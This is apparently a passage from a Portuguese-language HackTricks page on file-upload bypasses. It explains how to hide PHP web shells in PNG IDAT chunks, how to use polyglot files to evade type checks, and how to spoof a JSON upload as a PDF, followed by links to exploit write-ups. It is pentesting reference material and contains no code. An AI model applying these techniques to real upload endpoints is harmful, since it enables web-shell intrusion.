Incorporar um PHP shell no chunk IDAT de um arquivo PNG pode contornar efetivamente certas operações de processamento de imagem. As funções `imagecopyresized` e `imagecopyresampled` do PHP-GD são particularmente relevantes neste contexto, pois são comumente usadas para redimensionar e reamostrar imagens, respectivamente. A capacidade do PHP shell embutido de permanecer inalterado por essas operações é uma vantagem significativa para certos casos de uso.

Uma exploração detalhada desta técnica, incluindo sua metodologia e aplicações potenciais, é fornecida no seguinte artigo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Este recurso oferece uma compreensão abrangente do processo e suas implicações.

Mais informações em: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Arquivos Polyglot

Arquivos polyglot servem como uma ferramenta única na segurança cibernética, agindo como camaleões que podem existir validamente em múltiplos formatos de arquivo simultaneamente. Um exemplo intrigante é um [GIFAR](https://en.wikipedia.org/wiki/Gifar), um híbrido que funciona tanto como GIF quanto como um arquivo RAR. Esses arquivos não se limitam a essa combinação; combinações como GIF e JS ou PPT e JS também são viáveis.

A utilidade principal dos arquivos polyglot está na sua capacidade de contornar medidas de segurança que inspecionam arquivos com base no tipo. A prática comum em várias aplicações consiste em permitir apenas certos tipos de arquivo para upload — como JPEG, GIF ou DOC — para mitigar o risco que formatos potencialmente perigosos representam (por exemplo, JS, PHP ou arquivos Phar). No entanto, um polyglot, ao conformar-se aos critérios estruturais de múltiplos tipos de arquivo, pode contornar essas restrições de forma furtiva.

Apesar da adaptabilidade, polyglots encontram limitações. Por exemplo, enquanto um polyglot pode simultaneamente incorporar um arquivo PHAR (PHp ARchive) e um JPEG, o sucesso do upload pode depender das políticas de extensão de arquivo da plataforma. Se o sistema for rígido quanto às extensões permitidas, a mera dualidade estrutural de um polyglot pode não ser suficiente para garantir seu upload.

Mais informações em: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Fazer upload de JSONs válidos como se fossem PDF

Como evitar detecções de tipo de arquivo fazendo upload de um arquivo JSON válido mesmo que não seja permitido, falsificando um arquivo PDF (techniques from **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Desde que os bytes mágicos `%PDF` estejam nos primeiros 1024 bytes, é válido (ver exemplo no post)
- **`pdflib` library**: Adicione um formato PDF falso dentro de um campo do JSON para que a biblioteca pense que é um PDF (ver exemplo no post)
- **`file` binary**: Pode ler até 1048576 bytes de um arquivo. Basta criar um JSON maior que isso para que não consiga analisar o conteúdo como JSON e então, dentro do JSON, colocar a parte inicial de um PDF real e ele achará que é um PDF

## Referências

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
